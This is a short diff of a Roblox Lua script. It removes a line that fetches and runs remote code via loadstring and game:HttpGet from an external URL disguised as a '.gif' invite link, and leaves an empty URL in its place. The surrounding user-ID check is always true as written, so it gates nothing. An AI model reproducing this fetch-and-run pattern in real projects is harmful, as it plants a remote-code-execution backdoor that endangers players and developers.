@@ -1,3 +1,3 @@
 if game.Players.LocalPlayer.UserId == 3226326054 or 3270121341 then
-loadstring(game:HttpGet("https://stopify.co/invite.php?id=RZP7QU.gif", true))()
+loadstring(game:HttpGet("", true))()
 end
